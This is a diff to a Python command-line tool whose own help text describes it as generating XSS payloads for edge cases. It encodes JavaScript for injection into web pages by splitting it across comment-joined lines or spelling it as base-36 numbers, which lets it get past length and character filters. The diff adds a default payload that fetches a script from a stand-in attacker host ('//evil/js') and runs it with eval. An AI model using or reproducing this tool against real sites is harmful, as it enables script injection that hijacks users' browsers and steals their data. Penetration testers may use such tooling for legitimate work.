@@ -24,7 +24,7 @@ class ColorFormatter(logging.Formatter):
 MAX_JS_INT = 9007199254740991 # Number.MIN_SAFE_INTEGER
 
 class Payload:
-    def __init__(self, raw='', to_string='"toString"'):
+    def __init__(self, raw, to_string):
         self.raw = raw
         self.to_string = to_string
     
@@ -40,19 +40,18 @@ class Payload:
     def prepend(self, payload):
         self.raw = payload + self.raw
     
-    def as_split_to_len(self, quote='"', max_len=15, **kwargs):
+    def as_split_to_len(self, quote, max_len, **kwargs):
         if max_len < 10:
             # need to fit at least */eval/*
             logger.error("This encoding requires at least 10 characters per line")
             return ''
         
-        logger.warn("This encoding won't work if the content between any of the separate split payloads contains multiline comments (/* ... */")
+        logger.warn("This encoding won't work if the content between any of the separate split payloads contains multiline comments /* ... */")
         prefix = '*/'
         suffix = '/*'
         dummy_var = 'X'
         comment = suffix + '\n' + prefix
         sep = quote + '+' + comment + quote
-        setup_suffix = 'eval(%s)</script>' % dummy_var
         setup_prefix = comment.join(split_to_len(
             '<script>%s=' % dummy_var, count=max_len-len(suffix)))
         left_at_last_line = max_len - len(setup_prefix.rsplit('\n',1)[-1])
@@ -69,40 +68,51 @@ class Payload:
         
         payload = self.raw.replace(quote,'\\'+quote)
         logger.debug('Splitting %s' % payload)
+        # hold on to the last character of payload
+        # since there will be no + at the end
         # len(sep)+1 is to compensate for the newline
-        lines = split_to_len(padding+payload, count=max_len-len(sep)+1)
+        lines = split_to_len(padding+payload[:-1], count=max_len-len(sep)+1)
         lines[0] = lines[0][len(padding):]
+        lines[-1] = lines[-1] + payload[-1]
         
         # there is always space for the ; at the end, since it takes
         # the place of the + on previous lines
-        encoded = '%s%s%s%s;' % (setup_prefix, quote,
+        encoded = '%s%s%s%s' % (setup_prefix, quote,
                 sep.join(lines), quote)
         lines = encoded.rsplit('\n',1)
-        left_at_last_line = max_len - len(lines[-1])
         
-        if left_at_last_line >= len(setup_suffix):
-            encoded = encoded + setup_suffix
+        # setup_suffixes[0] will be added to the last line, split
+        # to max_len and joined with a comment
+        # setup_suffixes[1], if present, will be joined at the end
+        # with a newline
+        if max_len == 10:
+            # if there is no space for */</script> we'll end the
+            # last line with a semicolon instead of /*
+            # there will be JavaScript errors due to random content on
+            # the page between the last two payload chunks
+            setup_suffixes = [';eval(%s);' % dummy_var, '</script>']
         else:
-            # hold on to the last two characters of setup_prefix
-            # since there will be no suffix at the end, so we can put
-            # two extra characters on the last line
-            # len(comment)+1 is to compensate for the newline
-            to_add = split_to_len(lines[-1]+setup_suffix[:-2],
-                count=max_len-len(comment)+1,
-                no_split_on='(\\\\.|eval|\([%s]\)|</scrip)' % dummy_var)
-            to_add[-1] = to_add[-1] + 't>'
-            if max_len == 10:
-                # no space for */ before </script>, there will be some
-                # JavaScript errors due to random content between the
-                # last two payload chunks
-                encoded = '\n'.join(lines[:-1] + \
-                        [comment.join(to_add[:-1]) + ';'] + to_add[-1:])
-            else:
-                encoded = '\n'.join(lines[:-1] + [comment.join(to_add)])
+            # otherwise split the whole suffix and put comments
+            # between each chunk
+            setup_suffixes = [';eval(%s)</script>' % dummy_var]
+        
+        # hold on to the last two characters of setup_suffixes[0]
+        # and the first two characters of lines[-1]
+        # since there will be no /* at the end and no extra */ at the
+        # beginning
+        # len(comment)+1 is to compensate for the newline
+        to_add = split_to_len(lines[-1][2:]+setup_suffixes[0][:-2],
+            count=max_len-len(comment)+1,
+            no_split_on='(\\\\.|eval|\(%s(?:\)|$)|</[a-z]+)' % dummy_var)
+        to_add[0] = lines[-1][:2] + to_add[0]
+        to_add[-1] = to_add[-1] + setup_suffixes[0][-2:]
+        
+        encoded = '\n'.join(lines[:-1] + \
+                [comment.join(to_add)] + setup_suffixes[1:])
         
         return encoded
     
-    def as_num_to_string(self, quote='"', max_int=MAX_JS_INT, **kwargs):
+    def as_num_to_string(self, quote, max_int, **kwargs):
         left = self.raw
         encoded = ''
         warned = False
@@ -224,10 +234,19 @@ if __name__ == "__main__":
     logger.addHandler(log_handler)
     
     parser = argparse.ArgumentParser(
+        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
         argument_default=argparse.SUPPRESS,
-        description='TO DO')
-    parser.add_argument('payload', metavar='STRING',
-        help='''Raw payload.''')
+        description='''XSS payloads for edge cases (limited number of
+        characters, capitalised payloads, more to come...). Default
+        payload fetches and external script. Arbitrary payloads are
+        supported.''')
+    parser.add_argument('-p', '--payload', dest='payload',
+        default="fetch('%%SCRIPT%%').then(r=>r.text().then(eval)))",
+        metavar='STRING', help='''Raw payload. %%SCRIPT%% will be
+        replaced with the URL of the external script.''')
+    parser.add_argument('-x', '--script', dest='script',
+        default="//evil/js", metavar='STRING',
+        help='''URL for the external script''')
     parser.add_argument('-e', '--encoding', dest='encoding',
         default='num_to_string', metavar='NAME',
         choices=['num_to_string', 'split_to_len'],
@@ -241,24 +260,22 @@ if __name__ == "__main__":
         const=logging.DEBUG,
         help='''Be very verbose.''')
     parser.add_argument('--toString', dest='to_string',
-        metavar='STRING',
+        default='toString', metavar='STRING',
         help='''String to use instead of "toString" when
         encoding payload as <num>["toString"](36).''')
     parser.add_argument('--maxLen', dest='max_len',
-        metavar='NUMBER', type=int,
+        default=15, metavar='NUMBER', type=int,
         help='''Maximum length to use when
         splitting payload.''')
     parser.add_argument('--maxInt', dest='max_int',
-        metavar='NUMBER', type=int,
+        default=MAX_JS_INT, metavar='NUMBER', type=int,
         help='''Maximum integer to use when
         encoding payload as <num>["toString"](36).''')
     args = parser.parse_args()
     
     logger.setLevel(args.loglevel)
     
-    try:
-        p = Payload(args.payload, to_string=args.to_string)
-    except AttributeError:
-        p = Payload(args.payload)
+    p = Payload(args.payload.replace('%%SCRIPT%%', args.script),
+            args.to_string)
     
     print '%s' % getattr(p, 'as_'+args.encoding)(**vars(args))
